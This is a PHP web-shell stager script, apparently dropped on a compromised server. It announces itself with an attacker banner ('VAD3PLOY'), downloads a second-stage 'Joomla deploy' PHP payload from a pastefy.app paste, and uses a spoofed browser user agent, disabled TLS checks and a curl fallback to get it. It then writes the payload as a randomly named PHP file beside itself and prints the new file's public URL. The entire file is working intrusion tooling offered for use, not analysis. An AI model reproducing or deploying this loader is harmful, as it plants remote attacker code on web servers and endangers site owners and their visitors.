<?php
// ============================================================
//  stager -> pastefy deploy carrier
//  Stage 1: fetch the Joomla deploy script from pastefy
//  Stage 2: write it next to this file, print its URL
//  by 5162
// ============================================================
@header("Content-Type: text/plain");
@set_time_limit(0);

$m="VA"."D3PLOY";
echo "<h1 style='color: red;'><strong>[ Avacostn ] - ";
echo $m;

$u="https://pastefy.app/4XIQKnIj/raw";
$ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
$min=20000;   // pastefy payload is ~52 KB; anything smaller is a CF error page

$dir=@dirname(__FILE__);
if(!$dir || !@is_dir($dir)){$dir=@getcwd();}

$t=false; $how="none";

// --- 1. file_get_contents with an explicit UA (Cloudflare drops empty UA) ---
if(function_exists("file_get_contents")){
  $ctx=@stream_context_create(array(
    "http"=>array(
      "method"=>"GET",
      "header"=>"User-Agent: ".$ua."\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\n",
      "timeout"=>45,
      "follow_location"=>1,
      "max_redirects"=>5,
    ),
    "ssl"=>array("verify_peer"=>false,"verify_peer_name"=>false),
  ));
  $r=@file_get_contents($u,false,$ctx);
  if($r!==false && strlen((string)$r)>$min){$t=$r; $how="fgc";}
}

// --- 2. curl fallback ---
if((!$t || strlen((string)$t)<$min) && function_exists("curl_init")){
  $c=@curl_init($u);
  if($c){
    @curl_setopt($c,CURLOPT_RETURNTRANSFER,1);
    @curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);
    @curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);
    @curl_setopt($c,CURLOPT_SSL_VERIFYHOST,0);
    @curl_setopt($c,CURLOPT_TIMEOUT,45);
    @curl_setopt($c,CURLOPT_CONNECTTIMEOUT,15);
    @curl_setopt($c,CURLOPT_USERAGENT,$ua);
    @curl_setopt($c,CURLOPT_HTTPHEADER,array("Accept: */*"));
    $r=@curl_exec($c);
    $code=(int)@curl_getinfo($c,CURLINFO_HTTP_CODE);
    @curl_close($c);
    if($r!==false && strlen((string)$r)>$min){$t=$r; $how="curl";}
    else {echo "\n[STAGE1]curl http=".$code." bytes=".strlen((string)$r);}
  }
}

if(!$t || strlen((string)$t)<$min){
  echo "\n[STAGE1]fetch-fail how=".$how." bytes=".strlen((string)$t);
  exit;
}

// --- sanity: refuse to write a Cloudflare/HTML error page as a "shell" ---
$head=ltrim((string)$t);
if(substr($head,0,5)!=="<?php"){
  echo "\n[STAGE1]not-php bytes=".strlen($t)." sig=".substr(str_replace(array("\n","\r")," ",$head),0,48);
  exit;
}

echo "\n[STAGE1]fetch=".$how." bytes=".strlen($t);

$name="add_".substr(md5($t."|".$dir),0,6).".php";
$p=$dir."/".$name;
$w=@file_put_contents($p,$t);
if($w===false){
  echo "\n[STAGE1]write-fail dir=".$dir;
  exit;
}
@chmod($p,0644);

$size=@filesize($p);
echo "\n[STAGE1]file=".$name;
echo "\n[STAGE1]path=".$p;
echo "\n[STAGE1]written=".$w;
echo "\n[STAGE1]sizematch=".(($size==strlen($t))?"yes":"no");
echo "\n[STAGE1]md5=".md5($t);
echo "\n[STAGE1]marker=".$m;

$base=isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:"";
$base=preg_replace("/\?.*$/","",$base);
$url=(isset($_SERVER["HTTPS"])&&$_SERVER["HTTPS"]==="on"?"https":"http")."://".$_SERVER["HTTP_HOST"].$base;
echo "\n[STAGE2]url=".dirname($url)."/".$name;
//.php
